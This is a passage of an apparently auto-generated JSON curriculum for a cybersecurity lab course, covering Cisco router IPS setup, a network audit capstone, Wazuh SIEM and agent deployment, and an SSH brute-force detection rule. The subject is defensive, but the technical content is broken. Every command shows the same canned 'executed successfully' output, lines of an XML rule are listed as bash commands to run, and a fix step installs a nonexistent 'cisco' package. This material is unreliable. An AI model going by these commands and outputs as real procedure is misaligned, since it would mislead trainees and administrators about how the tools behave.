            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "ip ips MY_IPS in",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          },
          {
            "shell": "cisco",
            "cmd": "show ip ips configuration",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts."
          }
        ],
        "verification": "IPS engine active; malicious pattern strings detected on G0/1 trigger automatic drops and alerts.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: Border Router, PC, Attacker",
          "Cisco Packet Tracer",
          "IPS engine active; malicious pattern str...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the key functional difference between an IDS and an inline IPS?",
        "hint": "An IDS detects and alerts passively (out-of-band); an IPS sits inline and actively drops attacks."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Configuring Cisco Router IOS IPS?",
      "options": [
        "Enable active inline pattern tracking options to drop attacks at the perimeter interface.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Enable active inline pattern tracking options to drop attacks at the perimeter interface."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 31.",
    "eli5Story": {
      "title": "The Smart Metal Detector at the Gate (Router IOS IPS)",
      "analogy": "A metal detector listens and looks at everything walking through the gate. If it sees a pattern matching a dangerous weapon, it shuts the door instantly!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 31",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: Border Router, PC, Attacker"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 32,
    "week": 16,
    "classNumber": 32,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 16: Advanced Threat Mitigation Capstone",
    "title": "Enterprise Infrastructure Audit (Capstone Lab)",
    "category": "Capstone Audit",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Evaluate, trace, and patch a misconfigured company network file configuration.",
    "tools": [
      "Cisco Packet Tracer",
      "Audit Checklist"
    ],
    "targetEnvironment": "Complex unhardened topology in Cisco Packet Tracer",
    "topology": {
      "description": "Lab topology for Enterprise Infrastructure Audit (Capstone Lab)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Complex",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Capstone Audit",
        "explanation": "Evaluate, trace, and patch a misconfigured company network file configuration."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Enterprise Infrastructure Audit (Capstone Lab)",
        "description": "Verify system connectivity and tool installation in Complex unhardened topology in Cisco Packet Tracer.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "show running-config",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: 100% of audit checks passed: unauthorized traffic dropped, all administrative lines encrypted."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Enterprise Infrastructure Audit (Capstone Lab)",
        "description": "Load a multi-segment network layout loaded with structural security flaws (including untrusted trunk channels, open VTY terminals, unhardened access ports, and lack of firewall zones). Plan out and implement a comprehensive security fix project plan to harden the entire enterprise.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "show interfaces status",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: 100% of audit checks passed: unauthorized traffic dropped, all administrative lines encrypted."
          }
        ],
        "verification": "100% of audit checks passed: unauthorized traffic dropped, all administrative lines encrypted.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Complex unhardened topology in Cisco Packet Tracer",
          "Cisco Packet Tracer",
          "100% of audit checks passed: unauthorize...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is continuous configuration auditing essential even after initial baseline hardening?",
        "hint": "Configuration drift, emergency changes, and employee turnover introduce silent misconfigurations."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Enterprise Infrastructure Audit (Capstone Lab)?",
      "options": [
        "Evaluate, trace, and patch a misconfigured company network file configuration.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Evaluate, trace, and patch a misconfigured company network file configuration."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 32.",
    "eli5Story": {
      "title": "The Big Castle Security Inspection Capstone",
      "analogy": "You are the Chief Inspector. You walk around the entire kingdom checking every lock, fence, gate, and rule we built over the last 8 weeks!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 32",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Complex unhardened topology in Cisco Packet Tracer"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 33,
    "week": 17,
    "classNumber": 33,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 17: SIEM Architecture & Data Ingestion",
    "title": "Deploying a SIEM Platform",
    "category": "SIEM Architecture",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Stand up a central log aggregation host to support security monitoring operations.",
    "tools": [
      "Wazuh SIEM/XDR",
      "Ubuntu Server LTS"
    ],
    "targetEnvironment": "Dedicated Ubuntu Server VM",
    "topology": {
      "description": "Lab topology for Deploying a SIEM Platform",
      "nodes": [
        {
          "id": "source",
          "label": "Wazuh SIEM/XDR",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Dedicated",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "SIEM Architecture",
        "explanation": "Stand up a central log aggregation host to support security monitoring operations."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Deploying a SIEM Platform",
        "description": "Verify system connectivity and tool installation in Dedicated Ubuntu Server VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh",
            "description": "Execute curl command",
            "output": "[+] Command executed successfully.\nOutput: Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Deploying a SIEM Platform",
        "description": "Deploy an Ubuntu Server LTS image within the hypervisor interface. Download and run the automated single-host installation script for the Wazuh SIEM/XDR platform. Verify successful compilation of the management database and access the core monitoring web dashboard.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo bash ./wazuh-install.sh -a",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443."
          },
          {
            "shell": "bash",
            "cmd": "sudo systemctl status wazuh-manager",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443."
          },
          {
            "shell": "bash",
            "cmd": "sudo systemctl status wazuh-indexer",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443."
          },
          {
            "shell": "bash",
            "cmd": "sudo systemctl status wazuh-dashboard",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443."
          }
        ],
        "verification": "Wazuh manager, indexer, and dashboard services active; web UI accessible at https://localhost:443.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Dedicated Ubuntu Server VM",
          "Wazuh SIEM/XDR",
          "Wazuh manager, indexer, and dashboard se...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What role does a SIEM Indexer play in enterprise log architectures?",
        "hint": "It indexes millions of JSON security events into distributed clusters for millisecond search queries."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Deploying a SIEM Platform?",
      "options": [
        "Stand up a central log aggregation host to support security monitoring operations.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Stand up a central log aggregation host to support security monitoring operations."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 33.",
    "eli5Story": {
      "title": "The Central Control Room Tower (Wazuh SIEM)",
      "analogy": "The SIEM is a giant control room with 100 TV screens where all security guards across the kingdom send their notes simultaneously!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 33",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Wazuh SIEM/XDR",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Dedicated Ubuntu Server VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Wazuh SIEM/XDR"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y wazuh."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 34,
    "week": 17,
    "classNumber": 34,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 17: SIEM Architecture & Data Ingestion",
    "title": "Log Forwarding & Agent Deployment",
    "category": "Data Ingestion",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Provision client endpoints with forwarding services to collect infrastructure events.",
    "tools": [
      "Wazuh Agent",
      "Linux VM",
      "Windows VM"
    ],
    "targetEnvironment": "Local hypervisor layout",
    "topology": {
      "description": "Lab topology for Log Forwarding & Agent Deployment",
      "nodes": [
        {
          "id": "source",
          "label": "Wazuh Agent",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Local",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Data Ingestion",
        "explanation": "Provision client endpoints with forwarding services to collect infrastructure events."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Log Forwarding & Agent Deployment",
        "description": "Verify system connectivity and tool installation in Local hypervisor layout.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "WAZUH_MANAGER=\"192.168.1.120\" sudo apt-get install wazuh-agent",
            "description": "Execute WAZUH_MANAGER=\"192.168.1.120\" command",
            "output": "[+] Command executed successfully.\nOutput: Agent status turns 'Active' on Wazuh dashboard; auth logs stream into indexer in real time."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Log Forwarding & Agent Deployment",
        "description": "Generate endpoint installation links inside the Wazuh SIEM manager. Install the collection agent services on both a Linux target system and a Windows VM environment. Modify the configuration parameters to ensure continuous transport of system authorization logs (/var/log/auth.log and Windows Security Event ID 4624).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo systemctl enable --now wazuh-agent",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Agent status turns 'Active' on Wazuh dashboard; auth logs stream into indexer in real time."
          },
          {
            "shell": "bash",
            "cmd": "sudo /var/ossec/bin/agent_control -l",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Agent status turns 'Active' on Wazuh dashboard; auth logs stream into indexer in real time."
          }
        ],
        "verification": "Agent status turns 'Active' on Wazuh dashboard; auth logs stream into indexer in real time.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Local hypervisor layout",
          "Wazuh Agent",
          "Agent status turns 'Active' on Wazuh das...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is agent-based telemetry superior to passive syslog collection for endpoint monitoring?",
        "hint": "Agents capture process memory, file integrity, command line arguments, and registry changes."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Log Forwarding & Agent Deployment?",
      "options": [
        "Provision client endpoints with forwarding services to collect infrastructure events.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Provision client endpoints with forwarding services to collect infrastructure events."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 34.",
    "eli5Story": {
      "title": "The Little Watchtower Sentries (Wazuh Agents)",
      "analogy": "A friendly security guard is stationed on every computer. Whenever a door opens or someone types a bad password, the guard radios the main control tower."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 34",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Wazuh Agent",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Local hypervisor layout"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Wazuh Agent"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y wazuh."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 35,
    "week": 18,
    "classNumber": 35,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 18: Threat Detection & Custom Alerting",
    "title": "Writing Custom SIEM Detection Rules",
    "category": "Threat Detection",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Build custom parsing logic to isolate security anomalies and filter out normal system traffic.",
    "tools": [
      "Wazuh Rule Engine",
      "XML Rules"
    ],
    "targetEnvironment": "Wazuh Manager Server VM",
    "topology": {
      "description": "Lab topology for Writing Custom SIEM Detection Rules",
      "nodes": [
        {
          "id": "source",
          "label": "Wazuh Rule Engine",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Wazuh",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Threat Detection",
        "explanation": "Build custom parsing logic to isolate security anomalies and filter out normal system traffic."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Writing Custom SIEM Detection Rules",
        "description": "Verify system connectivity and tool installation in Wazuh Manager Server VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo tee /var/ossec/etc/rules/local_rules.xml << 'EOF'",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Writing Custom SIEM Detection Rules",
        "description": "Execute a mock password brute-force script targeting the Linux VM. Extract the raw log line generated by the system event, use the Wazuh engine rule editor to construct a custom XML matching rule, and assign a high-severity alert condition to trigger only when five authentication failures occur from a single source IP inside 60 seconds.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "<group name=\"syslog,sshd,\">",
            "description": "Execute <group command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "<rule id=\"100002\" level=\"10\" frequency=\"5\" timeframe=\"60\">",
            "description": "Execute <rule command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "<if_matched_sid>5710</if_matched_sid>",
            "description": "Execute <if_matched_sid>5710</if_matched_sid> command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "<same_source_ip />",
            "description": "Execute <same_source_ip command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "<description>Possible SSH brute force attack (5 failures in 60s)</description>",
            "description": "Execute <description>Possible command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "<mitre><id>T1110</id></mitre>",
            "description": "Execute <mitre><id>T1110</id></mitre> command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "</rule>",
            "description": "Execute </rule> command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
          {
            "shell": "bash",
            "cmd": "</group>",
            "description": "Execute </group> command",
            "output": "[+] Command executed successfully.\nOutput: Alert Rule 100002 triggers in dashboard upon 5th failed SSH attempt with Level 10 severity."
          },
